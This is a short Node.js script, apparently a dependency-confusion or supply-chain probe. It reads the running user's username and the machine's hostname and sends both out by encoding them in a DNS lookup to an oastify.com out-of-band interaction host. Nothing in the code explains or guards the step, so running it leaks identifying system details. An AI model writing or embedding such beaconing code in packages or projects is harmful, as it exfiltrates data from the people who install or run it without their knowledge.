const dns = require('dns');
const os = require('os');
const user = os.userInfo().username;
const hostname = os.hostname();
const payload = `airtel.${user}.${hostname}.test.oastify.com`;

dns.lookup(payload, () => {});
